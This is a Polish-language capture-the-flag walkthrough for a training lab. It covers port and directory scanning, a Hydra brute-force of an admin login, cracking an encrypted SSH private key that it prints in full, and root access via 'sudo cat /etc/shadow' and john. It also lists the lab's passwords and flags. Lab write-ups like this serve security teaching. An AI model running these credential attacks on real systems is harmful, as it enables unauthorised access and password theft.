@@ -1,0 +1,208 @@
+Projekt3 - bruteforce
+
+
+*Reconnaissance*
+
+Na poczatek wykonuje skanowanie za pomoca nmap:
+```
+sudo nmap -sS -sV 10.10.220.108
+```
+
+Nmap scan report for 10.10.220.108
+Host is up (0.20s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+*Nmap pokazał iż porty 22 oraz 80 są otwarte.*
+Uruchomiona wersja SSH to OpenSSH 7.6p1
+Uruchomiona wersja Apache to 2.4.29
+Uruchomiona wersja Linuxa to Ubuntu
+
+W tym momencie dokonuję enumeracji katalogu w celu wyszukania ukrytych
+katalogów na serwerze www:
+```
+gobuster dir -u http://10.10.220.108 --wordlist /usr/share/wordlists/dirb/common.txt
+```
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.220.108
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/09/18 04:01:57 Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 278]
+/.hta                 (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/admin                (Status: 301) [Size: 314] [--> http://10.10.220.108/admin/]
+/index.html           (Status: 200) [Size: 10918]                                
+/server-status        (Status: 403) [Size: 278]                                  
+                                                                                 
+===============================================================
+2022/09/18 04:02:24 Finished
+===============================================================
+
+**Ukryty katalog to /admin**
+
+
+*Zadanie 3:*
+Getting a shell
+
+Po wejściu na strone administratora http://10.10.220.108/admin/
+pojawia się panel logowania.
+Patrząc na źródło strony widać żródlo komentarza dla użytkownika
+**John**. Widnieje tam informacja iż nazwa użytkownika to **admin**.
+
+W tym momencie należy znaleźć hasło dla tego uzytkownika.
+*Używam narzedzia Hydra:*
+```
+hydra -l admin -P /home/kali/Desktop/Hacking/workspace/Zadania/rockyou.txt 10.10.220.108 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:invalid"
+```
+
+Otrzymane hasło to: 
+**password: xavier**
+
+Po zalogowaniu się do panelu admina pojawiło się hasło klucza prywatnego RSA Johna:
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA
+
+JCPsentybdCSx8QMOcWKnIAsnIRETjZjz6ALJkX3nKSI4t40y8WfWfkBiDqvxLIm
+UrFu3+/UCmXwceW6uJ7Z5CpqMFpUQN8oGUxcmOdPA88bpEBmUH/vD2K/Z+Kg0vY0
+BvbTz3VEcpXJygto9WRg3M9XSVsmsxpaAEl4XBN8EmlKAkR+FLj21qbzPzN8Y7bK
+HYQ0L43jIulNKOEq9jbI8O1c5YUwowtVlPBNSlzRMuEhceJ1bYDWyUQk3zpVLaXy
++Z3mZtMq5NkAjidlol1ZtwMxvwDy478DjxNQZ7eR/coQmq2jj3tBeKH9AXOZlDQw
+UHfmEmBwXHNK82Tp/2eW/Sk8psLngEsvAVPLexeS5QArs+wGPZp1cpV1iSc3AnVB
+VOxaB4uzzTXUjP2H8Z68a34B8tMdej0MLHC1KUcWqgyi/Mdq6l8HeolBMUbcFzqA
+vbVm8+6DhZPvc4F00bzlDvW23b2pI4RraI8fnEXHty6rfkJuHNVR+N8ZdaYZBODd
+/n0a0fTQ1N361KFGr5EF7LX4qKJz2cP2m7qxSPmtZAgzGavUR1JDvCXzyjbPecWR
+y0cuCmp8BC+Pd4s3y3b6tqNuharJfZSZ6B0eN99926J5ne7G1BmyPvPj7wb5KuW1
+yKGn32DL/Bn+a4oReWngHMLDo/4xmxeJrpmtovwmJOXo5o+UeEU3ywr+sUBJc3W8
+oUOXNfQwjdNXMkgVspf8w7bGecucFdmI0sDiYGNk5uvmwUjukfVLT9JPMN8hOns7
+onw+9H+FYFUbEeWOu7QpqGRTZYoKJrXSrzII3YFmxE9u3UHLOqqDUIsHjHccmnqx
+zRDSfkBkA6ItIqx55+cE0f0sdofXtvzvCRWBa5GFaBtNJhF940Lx9xfbdwOEZzBD
+wYZvFv3c1VePTT0wvWybvo0qJTfauB1yRGM1l7ocB2wiHgZBTxPVDjb4qfVT8FNP
+f17Dz/BjRDUIKoMu7gTifpnB+iw449cW2y538U+OmOqJE5myq+U0IkY9yydgDB6u
+uGrfkAYp6NDvPF71PgiAhcrzggGuDq2jizoeH1Oq9yvt4pn3Q8d8EvuCs32464l5
+O+2w+T2AeiPl74+xzkhGa1EcPJavpjogio0E5VAEavh6Yea/riHOHeMiQdQlM+tN
+C6YOrVDEUicDGZGVoRROZ2gDbjh6xEZexqKc9Dmt9JbJfYobBG702VC7EpxiHGeJ
+mJZ/cDXFDhJ1lBnkF8qhmTQtziEoEyB3D8yiUvW8xRaZGlOQnZWikyKGtJRIrGZv
+OcD6BKQSzYoo36vNPK4U7QAVLRyNDHyeYTo8LzNsx0aDbu1rUC+83DyJwUIxOCmd
+6WPCj80p/mnnjcF42wwgOVtXduekQBXZ5KpwvmXjb+yoyPCgJbiVwwUtmgZcUN8B
+zQ8oFwPXTszUYgNjg5RFgj/MBYTraL6VYDAepn4YowdaAlv3M8ICRKQ3GbQEV6ZC
+miDKAMx3K3VJpsY4aV52au5x43do6e3xyTSR7E2bfsUblzj2b+mZXrmxst+XDU6u
+x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
+-----END RSA PRIVATE KEY-----
+
+
+oraz flaga:
+**THM{brut3_f0rce_is_e4sy}**
+
+Za pomocą polecenia: 
+```
+wget http://10.10.220.108/admin/panel/id_rsa 
+```
+można uzyskać klucz RSA w systemie lokalnym.
+
+Jezeli wget nie zadziała to nalezy wejsc na strone z kluczem:
+ctrl S
+
+Najpierw należy znaleźć hasło dla klucza prywatnego RSA ssh, 
+ponieważ jest on zaszyfrowany.
+ssh2john.py służy do konwersji klucza RSA na format tekstowy.
+W tym celu należy użyć skryptu Pythona "ssh2john":
+
+```
+/usr/share/john/ssh2john.py id_rsa > id_rsa.txt
+```
+
+*Pojawił się plik:*
+id_rsa.txt
+
+Teraz należy użyć narzędzie john w celu zdobycia hasła klucza prywatnego RSA:
+```
+john id_rsa.txt -wordlist=rockyou.txt
+```
+
+Uzyskane hasło to:
+**rockinroll**
+
+Należy jeszecze dać upraweniania dla pliku:
+```
+chmod 400 id_rsa
+```
+
+
+Podczas enumeracji nmap wykazał iż port 22 jest otwarty i działa
+a nim usługa ssh. Teraz należy zalogować się na koncie johna
+wpisujac hasło **rockinroll**:
+
+```
+ssh john@10.10.220.108 -i id_rsa
+```
+
+Po zalogowaniu się na koncie użytkownika john należy wyszukać
+i otworzyć plik user.txt w którym będzie flaga
+**THM{a_password_is_not_a_barrier}**
+
+https://www.samltool.com/format_privatekey.php
+
+
+*Zadanie 4:*
+Privilege Escalation
+
+Za pomocą komendy **sudo -l** mozna sprawdzić uprawnienia użytkownika.
+Użytkownik john może uruchomić polecenie **/bin/cat** jako root.
+
+User john may run the following commands on bruteit:
+    (root) NOPASSWD: /bin/cat
+
+Teraz na stronie https://gtfobins.github.io/ należy sprawdzić 
+czy można wykorzystać /bin/cat.
+
+Należy wejść do pliku /etc/shadow, który zawiera użytkowników systemu i hasła:
+```
+cat /etc/passwd
+oraz
+sudo cat /etc/shadow
+```
+
+*Kali Linux:* 
+Należy stworzyć plik i skopiować zawartość z pliku shadow:
+```
+vim hashes.txt
+```
+
+W tym momencie pozostaje użyć narzędzia john do złamania skrótów 
+za pomocą rockyou.txt:
+```
+john hashes.txt --wordlist=rockyou.txt
+```
+
+Uzyskane hasło to:
+**football**
+
+Teraz na koncie johna należy użyć polecenia:
+```
+su root  
+hasło: football
+```
+
+Pozostaje otworzyć zawartość pliku z flagą:
+```
+cd root
+cat root.txt
+Uzyskana flaga to:
+THM{pr1v1l3g3_3sc4l4t10n}
+```
